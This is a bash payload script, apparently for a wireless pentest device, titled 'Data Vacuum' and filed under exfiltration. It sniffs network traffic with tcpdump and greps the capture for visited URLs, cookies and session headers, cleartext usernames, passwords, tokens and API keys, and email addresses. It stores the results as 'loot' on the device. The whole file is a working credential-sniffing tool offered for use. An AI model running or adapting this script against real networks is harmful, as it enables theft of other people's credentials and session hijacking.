#!/bin/bash
# Title: Data Vacuum
# Author: NullSec
# Description: Captures and extracts interesting data from network traffic
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/datavacuum"
mkdir -p "$LOOT_DIR"

PROMPT "DATA VACUUM

Vacuums interesting data
from network traffic in
real-time.

Extracts:
- URLs visited
- Cookies & sessions
- Credentials (cleartext)
- Email addresses
- POST form data

Press OK to configure."

# Find capture interface
IFACE=""
for i in br-lan wlan1mon eth0 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE="$i" && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No capture interface!

Ensure br-lan or wlan1mon
is available."; exit 1; }

LOG "Capture interface: $IFACE"

PROMPT "EXTRACTION MODE:

1. URLs only
2. Cookies & sessions
3. Credentials (cleartext)
4. Email addresses
5. Everything (full vacuum)

Interface: $IFACE
Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-5):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=5 ;; esac
[ "$MODE" -lt 1 ] && MODE=1
[ "$MODE" -gt 5 ] && MODE=5

DURATION=$(NUMBER_PICKER "Duration (minutes):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac
[ "$DURATION" -lt 1 ] && DURATION=1
[ "$DURATION" -gt 720 ] && DURATION=720

DURATION_S=$((DURATION * 60))

MAX_SIZE=$(NUMBER_PICKER "Max loot MB:" 50)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_SIZE=50 ;; esac
[ "$MAX_SIZE" -lt 1 ] && MAX_SIZE=1
[ "$MAX_SIZE" -gt 500 ] && MAX_SIZE=500

resp=$(CONFIRMATION_DIALOG "START VACUUM?

Interface: $IFACE
Mode: $MODE
Duration: ${DURATION}m
Max size: ${MAX_SIZE}MB

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION_DIR="$LOOT_DIR/session_$TIMESTAMP"
mkdir -p "$SESSION_DIR"
URL_LOG="$SESSION_DIR/urls.txt"
COOKIE_LOG="$SESSION_DIR/cookies.txt"
CRED_LOG="$SESSION_DIR/credentials.txt"
EMAIL_LOG="$SESSION_DIR/emails.txt"
RAW_LOG="$SESSION_DIR/raw_data.txt"

LOG "Data Vacuum started - Mode $MODE"
SPINNER_START "Vacuuming traffic..."

# Build grep patterns per mode
extract_urls() {
    grep -oiE 'https?://[a-zA-Z0-9./?=_%&:#@!~\-]+' >> "$URL_LOG"
}
extract_cookies() {
    grep -iE 'cookie:|set-cookie:' >> "$COOKIE_LOG"
}
extract_creds() {
    grep -iE 'user(name)?=|pass(word)?=|login=|email=|auth|token=|api[_-]?key' >> "$CRED_LOG"
}
extract_emails() {
    grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' >> "$EMAIL_LOG"
}

# Capture and pipe through extraction
PCAP_TMP="$SESSION_DIR/capture.pcap"
timeout "$DURATION_S" tcpdump -i "$IFACE" -A -s 0 -c 100000 \
    'tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 21 or tcp port 25 or tcp port 110' \
    -w "$PCAP_TMP" 2>/dev/null &
TCPDUMP_PID=$!

# Monitor size limit in background
(
    while kill -0 "$TCPDUMP_PID" 2>/dev/null; do
        CURRENT_SIZE=$(du -sm "$SESSION_DIR" 2>/dev/null | awk '{print $1}')
        if [ "${CURRENT_SIZE:-0}" -ge "$MAX_SIZE" ]; then
            kill "$TCPDUMP_PID" 2>/dev/null
            break
        fi
        sleep 5
    done
) &
MONITOR_PID=$!

wait "$TCPDUMP_PID" 2>/dev/null
kill "$MONITOR_PID" 2>/dev/null

SPINNER_STOP

# Post-process pcap
if [ -f "$PCAP_TMP" ]; then
    SPINNER_START "Extracting data..."

    PCAP_TEXT="$SESSION_DIR/pcap_ascii.txt"
    tcpdump -A -r "$PCAP_TMP" 2>/dev/null > "$PCAP_TEXT"

    case $MODE in
        1) cat "$PCAP_TEXT" | extract_urls ;;
        2) cat "$PCAP_TEXT" | extract_cookies ;;
        3) cat "$PCAP_TEXT" | extract_creds ;;
        4) cat "$PCAP_TEXT" | extract_emails ;;
        5)
            cat "$PCAP_TEXT" | extract_urls
            cat "$PCAP_TEXT" | extract_cookies
            cat "$PCAP_TEXT" | extract_creds
            cat "$PCAP_TEXT" | extract_emails
            ;;
    esac

    # Deduplicate
    for f in "$URL_LOG" "$COOKIE_LOG" "$CRED_LOG" "$EMAIL_LOG"; do
        [ -f "$f" ] && sort -u "$f" -o "$f"
    done

    rm -f "$PCAP_TEXT"
    SPINNER_STOP
fi

# Summary
URL_C=0; COOKIE_C=0; CRED_C=0; EMAIL_C=0
[ -f "$URL_LOG" ] && URL_C=$(wc -l < "$URL_LOG" | tr -d ' ')
[ -f "$COOKIE_LOG" ] && COOKIE_C=$(wc -l < "$COOKIE_LOG" | tr -d ' ')
[ -f "$CRED_LOG" ] && CRED_C=$(wc -l < "$CRED_LOG" | tr -d ' ')
[ -f "$EMAIL_LOG" ] && EMAIL_C=$(wc -l < "$EMAIL_LOG" | tr -d ' ')
TOTAL=$((URL_C + COOKIE_C + CRED_C + EMAIL_C))
LOOT_SIZE=$(du -sh "$SESSION_DIR" 2>/dev/null | awk '{print $1}')

LOG "Vacuum complete: $TOTAL items extracted"

PROMPT "VACUUM COMPLETE

URLs:        $URL_C
Cookies:     $COOKIE_C
Credentials: $CRED_C
Emails:      $EMAIL_C
Total:       $TOTAL items
Size:        $LOOT_SIZE

Loot: $SESSION_DIR"
